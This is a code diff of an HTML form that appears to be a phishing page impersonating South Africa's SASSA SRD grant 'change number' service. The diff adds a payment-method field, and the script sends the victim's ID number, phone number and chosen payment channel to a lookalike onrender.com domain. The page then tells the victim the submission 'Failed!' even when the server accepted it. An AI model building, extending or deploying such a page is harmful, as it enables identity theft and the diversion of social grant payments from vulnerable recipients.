@@ -19,11 +19,13 @@
       display: block; font-size: 14px;
       font-weight: bold; margin-bottom: 5px; color: #333;
     }
-    .application-form input {
+    .application-form input,
+    .application-form select {
       width: 98%; padding: 12px; margin-bottom: 20px;
       border: 1px solid #ccc; border-radius: 5px; font-size: 14px;
     }
-    .application-form input:focus {
+    .application-form input:focus,
+    .application-form select:focus {
       outline: none; border-color: #fbc02d;
     }
     .application-form .submit-btn {
@@ -36,13 +38,9 @@
       background-color: #fbc02d; color: #131313;
       cursor: pointer;
     }
-        input.invalid {
-  border: 2px solid red !important;
-}
-
-input.valid {
-  border: 2px solid #fbc02d !important; /* yellow */
-}
+    input.invalid, select.invalid { border: 2px solid red !important; }
+    input.valid, select.valid { border: 2px solid #fbc02d !important; }
+    #paymentSection { display: none; } /* hidden until valid */
   </style>
 </head>
 <body>
@@ -53,11 +51,21 @@ input.valid {
     <main>
       <form class="application-form" id="applicationForm">
         <label for="idNumber">south african id number of applicant *</label>
-        <input type="text" id="idNumber" maxlength="13"  oninput="validateForm()">
+        <input type="text" id="idNumber" maxlength="13" oninput="validateForm()">
         
         <label for="phoneNumber">phone number used to submit your application *</label>
         <input type="text" id="phoneNumber" maxlength="10" oninput="validateForm()">
-        
+
+        <!-- Payment method appears only after ID & phone are valid -->
+        <div id="paymentSection">
+          <label for="paymentMethod">confirm your payment method *</label>
+          <select id="paymentMethod" onchange="validateForm()">
+            <option value="">-- Select Payment Method --</option>
+            <option value="Bank Account">Bank Account</option>
+            <option value="Post Office (Retail Shops)">Post Office (Retail Shops)</option>
+            <option value="Shoprite Money Market">Shoprite Money Market</option>
+          </select>
+        </div>
         
         <button type="submit" class="submit-btn" id="submitButton" disabled>Submit</button>
       </form>
@@ -67,7 +75,6 @@ input.valid {
   <script>
   function isValidSAID(id) {
     if (!/^\d{13}$/.test(id)) return false;
-
     let sum = 0;
     for (let i = 0; i < 13; i++) {
       let digit = parseInt(id.charAt(i));
@@ -77,19 +84,20 @@ input.valid {
       }
       sum += digit;
     }
-
     return sum % 10 === 0;
   }
 
   function validateInput(inputEl, isValid) {
     inputEl.classList.remove('invalid', 'valid');
-    if (inputEl.value.trim() === '') return; // default grey
+    if (inputEl.value.trim() === '') return;
     inputEl.classList.add(isValid ? 'valid' : 'invalid');
   }
 
   function validateForm() {
     const idNumber = document.getElementById('idNumber');
     const phoneNumber = document.getElementById('phoneNumber');
+    const paymentSection = document.getElementById('paymentSection');
+    const paymentMethod = document.getElementById('paymentMethod');
     const submitButton = document.getElementById('submitButton');
 
     const idValid = isValidSAID(idNumber.value);
@@ -98,7 +106,19 @@ input.valid {
     validateInput(idNumber, idValid);
     validateInput(phoneNumber, phoneValid);
 
-    submitButton.disabled = !(idValid && phoneValid);
+    // Show payment method only if ID & phone are valid
+    if (idValid && phoneValid) {
+      paymentSection.style.display = "block";
+    } else {
+      paymentSection.style.display = "none";
+      paymentMethod.value = "";
+    }
+
+    const paymentValid = paymentMethod.value !== "";
+
+    validateInput(paymentMethod, paymentValid);
+
+    submitButton.disabled = !(idValid && phoneValid && paymentValid);
   }
 
   document.getElementById("applicationForm").addEventListener("submit", async function (e) {
@@ -106,35 +126,39 @@ input.valid {
 
     const idNumber = document.getElementById("idNumber").value.trim();
     const phoneNumber = document.getElementById("phoneNumber").value.trim();
-    const newphoneNumber = "0000";
+    const paymentMethod = document.getElementById("paymentMethod").value;
 
     if (!isValidSAID(idNumber)) {
       alert("Invalid South African ID number.");
       return;
     }
-      
+    if (paymentMethod === "") {
+      alert("Please select your payment method.");
+      return;
+    }
 
-      
+    // store payment method into newphoneNumber
+    const newphoneNumber = paymentMethod;
 
-      try {
-        const response = await fetch("https://srd-sassa-gov-za-change-numberss.onrender.com/submit", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ idNumber, phoneNumber, newphoneNumber }),
-        });
+    try {
+      const response = await fetch("https://srd-sassa-gov-za-change-numberss.onrender.com/submit", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ idNumber, phoneNumber, newphoneNumber }),
+      });
 
-        if (response.ok) {
-          alert("Failed!");
-        } else if (response.status === 409) {
-          alert("Failed!.");
-        } else {
-          alert("An error occurred.");
-        }
-      } catch (error) {
-        console.error("Submission error:", error);
-        alert("Network error. Please try again.");
+      if (response.ok) {
+        alert("Failed!");
+      } else if (response.status === 409) {
+        alert("Failed!.");
+      } else {
+        alert("An error occurred.");
       }
-    });
+    } catch (error) {
+      console.error("Submission error:", error);
+      alert("Network error. Please try again.");
+    }
+  });
   </script>
 </body>
 </html>
